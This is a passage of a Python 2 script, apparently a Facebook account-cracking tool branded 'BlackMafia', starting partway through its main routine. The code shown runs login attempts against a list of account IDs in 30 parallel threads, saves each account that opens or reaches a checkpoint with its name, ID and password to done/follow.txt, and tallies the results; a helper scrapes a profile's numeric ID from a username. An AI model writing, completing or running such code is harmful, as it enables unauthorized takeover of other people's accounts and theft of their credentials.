                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} \x1b[1;95mCEKPOINT'
                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;95m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;95m' + zowe
                                    print '\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;95m' + bos6
                                    cek = open('done/follow.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80BlackMafia\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mFinished ...'
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;95mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;95m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;95mCP \x1b[1;95mfile Save \x1b[1;91m: \x1b[1;92mdone/follow.txt'
    print 50 * '\x1b[1;94m\xe2\x94\x80'
    raw_input('\x1b[1;97m{<\x1b[1;95mBack\x1b[1;97m>}')
    os.system('python2 lovehacker.py')


def user_id():
    os.system('clear')
    print logo
    print 36 * '\x1b[1;94m\xe2\x96\x93'
    ling = 'https://www.facebook.com/'
    url = ling + raw_input('\x1b[1;97m{\x1b[1;95m\xc3\x97\x1b[1;97m} Username : ')
    idre = re.compile('"entity_id":"([0-9]+)"')
    page = requests.get(url)
    print idre.findall(page.content)
    raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
    menu()



if __name__ == '__main__':
    menu()
    login()
    masuk()
